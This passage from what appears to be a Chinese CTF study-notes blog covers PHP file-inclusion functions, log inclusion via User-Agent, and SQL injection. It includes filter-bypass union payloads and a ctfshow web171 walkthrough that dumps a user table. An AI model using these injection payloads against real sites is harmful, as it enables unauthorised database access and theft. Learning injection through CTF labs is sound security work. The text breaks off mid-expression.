class="keyword">require</span>类似，但是只包含文件一次，</span><br><span class="line">即使多次调用<span class="keyword">require_once</span>函数，也只会包含一次文件。</span><br><span class="line"></span><br><span class="line"><span class="comment">// 只包含一次文件&quot;example.php&quot;</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;example.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">5</span>.include_path：</span><br><span class="line">用于获取或设置 PHP 的包含文件搜索路径。</span><br><span class="line">可以通过该函数添加自定义的文件搜索路径。</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取当前的包含文件搜索路径</span></span><br><span class="line"><span class="variable">$path</span> = <span class="title function_ invoke__">get_include_path</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置新的包含文件搜索路径</span></span><br><span class="line"><span class="title function_ invoke__">set_include_path</span>(<span class="variable">$path</span> . <span class="string">&quot;:/path/to/custom/directory&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">6</span>.get_required_files：</span><br><span class="line">返回在当前脚本中已经通过<span class="keyword">require</span>和<span class="keyword">include</span>包含的所有文件的数组。</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取当前脚本中已经包含的文件</span></span><br><span class="line"><span class="variable">$includedFiles</span> = <span class="title function_ invoke__">get_required_files</span>();</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$includedFiles</span>);</span><br><span class="line"></span><br><span class="line"><span class="number">7</span>.file_exists：</span><br><span class="line">用于检查文件或目录是否存在。</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查文件是否存在</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;path/to/file.txt&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;文件存在&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;文件不存在&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">8</span>. is_file：用于判断给定的路径是否为一个文件。</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断路径是否为一个文件</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_file</span>(<span class="string">&#x27;path/to/file.txt&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;这是一个文件&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;这不是一个文件&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">9</span>.is_dir：</span><br><span class="line">用于判断给定的路径是否为一个目录。</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断路径是否为一个目录</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_dir</span>(<span class="string">&#x27;path/to/directory&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;这是一个目录&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;这不是一个目录&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">10</span>. realpath：返回给定的相对路径的绝对路径。</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取文件的绝对路径</span></span><br><span class="line"><span class="variable">$absolutePath</span> = <span class="title function_ invoke__">realpath</span>(<span class="string">&#x27;path/to/file.txt&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$absolutePath</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">11</span>. dirname：返回给定路径的目录部分。</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取路径的目录部分</span></span><br><span class="line"><span class="variable">$directory</span> = <span class="title function_ invoke__">dirname</span>(<span class="string">&#x27;/path/to/file.txt&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$directory</span>;</span><br></pre></td></tr></table></figure>

<h2 id="日志包含"><a href="#日志包含" class="headerlink" title="日志包含"></a>日志包含</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42181428/article/details/87090539">源头博客</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 某种特殊情况下，访问apache日志，修改UA为注入语句再访问</span></span><br><span class="line"><span class="comment"># 如果访问成功则代表有apache日志注入</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>日志包含可以使用 <code>.user.ini</code> 包含到本文件当中，并且在UA当中注入代码并获取代码执行结果。（参照： <code>web169~170</code> ）</p>
<h1 id="python函数"><a href="#python函数" class="headerlink" title="python函数"></a>python函数</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用session进行权限维持</span></span><br><span class="line"></span><br><span class="line">unicodedata.numeric			将字符转换为整数，包括中文的字符</span><br><span class="line">urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))	读取cookie参数的值</span><br><span class="line">urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))	读取get参数的值</span><br><span class="line">request.remote_addr			读取客户端IP地址</span><br><span class="line">urllib.urlopen(param).read()读取网络文件，这个参数可以是http/s网址</span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件操作函数</span></span><br><span class="line">tmpfile = <span class="built_in">open</span>(<span class="string">&#x27;1.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>官方正常的语法<a target="_blank" rel="noopener" href="https://www.mysqlzh.com/doc/124.html">点我</a><br>select替代方法：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/taoyaostudy/p/13479367.html#:~:text=handler%E8%AF%AD%E5%8F%A5%E7%9A%84%E8%AF%AD%E6%B3%95%E5%A6%82%E4%B8%8B%EF%BC%9A%20HANDLER%20tbl_name%20OPEN%20%5B%20%5B%20AS%5D%20alias,%7C%20NEXT%20%7D%20%5B%20WHERE%20where_condition%20%5D%20%5BLIMIT">handler</a></p>
<p>SQL注入详细总结的博客：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/339118.html">Nday00</a></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 绕过 union select组合的封禁的办法</span></span><br><span class="line"><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span></span><br><span class="line"></span><br><span class="line">information_schema的代替表: mysql.innodb_table_stats</span><br><span class="line">堆叠查询</span><br><span class="line"><span class="keyword">select</span> group_concat(b) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> <span class="keyword">as</span> b,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users)a</span><br><span class="line"><span class="number">1</span><span class="string">&#x27;/**/union/**/select/**/1,(select/**/group_concat(b)/**/from/**/(select/**/1,2/**/as/**/b,3/**/union/**/select/**/*/**/from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27;</span></span><br></pre></td></tr></table></figure>

<p>写题目记录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">web171 -- 一般流程</span><br><span class="line"># 找列</span><br><span class="line">order by 3 -- -</span><br><span class="line">order by 4 -- - </span><br><span class="line"># 堆叠查询</span><br><span class="line"># 查库</span><br><span class="line"># 堆叠查询数据库相关信息</span><br><span class="line">get: 1&#x27;union select 2,database(),3 -- -																										&#x27;</span><br><span class="line">return: ctfshow_web</span><br><span class="line"># 查其它库</span><br><span class="line">get: 1&#x27;union select 2,(group_concat(schema_name)),4 from information_schema.schemata-- -																										&#x27;</span><br><span class="line">return: information_schema,test,mysql,performance_schema,ctfshow_web</span><br><span class="line"># 查表</span><br><span class="line">get: 1&#x27;union select 2,(group_concat(table_name)),4 from information_schema.tables where table_schema=&#x27;ctfshow_web&#x27;-- -																										&#x27;</span><br><span class="line">return: ctfshow_user</span><br><span class="line"># 查字段</span><br><span class="line">get: 1&#x27;union select 2,(group_concat(column_name)),4 from information_schema.columns where table_name=&#x27;ctfshow_user&#x27;-- -																										&#x27;</span><br><span class="line">return: id,username,password</span><br><span class="line"># 查字段对应的内容</span><br><span class="line">get: 1&#x27;union select 2,(group_concat(password)),4 from ctfshow_user-- -																										&#x27;</span><br><span class="line">return: admin,111,222,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,ctfshow&#123;a53003e4-a479-47e2-b618-b24d4eabffb8&#125;</span><br><span class="line"></span><br><span class="line">web 184</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="其它注点知识"><a href="#其它注点知识" class="headerlink" title="其它注点知识"></a>其它注点知识</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> ctfshow a <span class="keyword">inner</span> <span class="keyword">join</span> ctfshow b <span class="keyword">on</span> b.pass <span class="keyword">like</span> <span class="number">0</span>x???????????</span><br></pre></td></tr></table></figure>

<h3 id="join语法"><a href="#join语法" class="headerlink" title="join语法"></a>join语法</h3><p>具体参照<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36501591/article/details/116234694">多表查询</a></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 内连接：两个表共有的数据进行连接</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 普通的内连接</span><br><span class="line">slect <span class="operator">*</span> <span class="keyword">from</span> ctfshow_user a <span class="keyword">inner</span> <span class="keyword">join</span> ctfshow_user b <span class="keyword">on</span> a.pass<span class="operator">=</span>b.pass;</span><br><span class="line"># 解构：</span><br><span class="line"><span class="keyword">select</span> (值) <span class="keyword">from</span> 表<span class="number">1</span> 表<span class="number">1</span>别称名 <span class="keyword">inner</span> <span class="keyword">join</span> 表<span class="number">2</span> 表<span class="number">2</span>别称名 b <span class="keyword">on</span> 条件表达式  </span><br><span class="line"># 条件表达式不局限于 a.pass<span class="operator">=</span>b.pass,同样的也适用于 a.pass <span class="keyword">like</span> <span class="string">&#x27;ctfshow%&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="like语法："><a href="#like语法：" class="headerlink" title="like语法："></a>like语法：</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># <span class="number">0</span>x??????????? <span class="operator">-</span><span class="operator">&gt;</span> 十六进制的编码，把字符转为ascii的十进制形式再转为十六进制编码(hex(ord(asciiStr)))</span><br><span class="line"># 若干个(hex(ord))拼凑在一起，前面再加个<span class="number">0</span>x，使用<span class="keyword">like</span>语法拼接，可以达到形如 <span class="keyword">like</span> <span class="string">&#x27;ctfshow&#123;%&#x27;</span> 的效果。</span><br><span class="line"></span><br><span class="line">slect <span class="operator">*</span> <span class="keyword">from</span> ctfshow_user a <span class="keyword">inner</span> <span class="keyword">join</span> ctfshow_user b <span class="keyword">on</span> a.pass <span class="keyword">like</span> <span class="string">&#x27;ctfshow%&#x27;</span>;</span><br><span class="line"><span class="comment">-- 等价于</span></span><br><span class="line">slect <span class="operator">*</span> <span class="keyword">from</span> ctfshow_user a <span class="keyword">inner</span> <span class="keyword">join</span> ctfshow_user b <span class="keyword">on</span> a.pass <span class="keyword">like</span> <span class="number">0x6534353961643338646663353537636635333134363764306535386566363734</span>;</span><br></pre></td></tr></table></figure>

<h3 id="having语法"><a href="#having语法" class="headerlink" title="having语法"></a>having语法</h3><p>having搭配 <code>group by</code> 使用，适用于 <code>maridb</code> 数据库，mysql试验的时候不知道出了什么差错失效了。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(age) <span class="keyword">from</span> test2 <span class="keyword">group</span> <span class="keyword">by</span> age <span class="keyword">having</span> age <span class="keyword">like</span> <span class="string">&#x27;%ctf%&#x27;</span>;</span><br><span class="line"># 相当于：</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(age) <span class="keyword">from</span> test2 <span class="keyword">where</span> age <span class="keyword">like</span> <span class="string">&#x27;%ctf%&#x27;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="布尔绕过数字限制-数字输入"><a href="#布尔绕过数字限制-数字输入" class="headerlink" title="布尔绕过数字限制/数字输入"></a>布尔绕过数字限制/数字输入</h3><p>使用 <code>concat</code> 组装字符串绕过字符被限制的情况。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> concat(<span class="literal">true</span>,<span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span>);</span><br><span class="line"># 返回：<span class="number">13</span></span><br></pre></td></tr></table></figure>

<h3 id="concat巧用"><a href="#concat巧用" class="headerlink" title="concat巧用"></a>concat巧用</h3><p>组合字符串的巧妙用法：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#<span class="operator">&gt;</span>concat 运用</span><br><span class="line"><span class="keyword">select</span> concat(<span class="literal">true</span>,<span class="literal">true</span><span class="operator">+</span><span class="literal">true</span>)</span><br><span class="line">#<span class="operator">&gt;</span>等价于</span><br><span class="line"><span class="keyword">select</span> concat(<span class="number">1</span>,<span class="number">2</span>)</span><br><span class="line">#<span class="operator">=</span>得到的结果：<span class="number">12</span></span><br><span class="line"><span class="comment">-- 这样子是纯粹的数字拼接，如果是字符：</span></span><br><span class="line">#<span class="operator">&gt;</span>字符拼接</span><br><span class="line"><span class="keyword">select</span> concat(<span class="string">&#x27;ctf&#x27;</span>,<span class="string">&#x27;show&#x27;</span>)</span><br><span class="line">#<span class="operator">=</span>得到的结果：ctfshow</span><br></pre></td></tr></table></figure>

<p>如果是使用char和true的组合：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> concat(<span class="type">char</span>(<span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span>),<span class="type">char</span>(<span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span>),<span class="type">char</span>(<span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span>),<span class="type">char</span>(<span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span><span 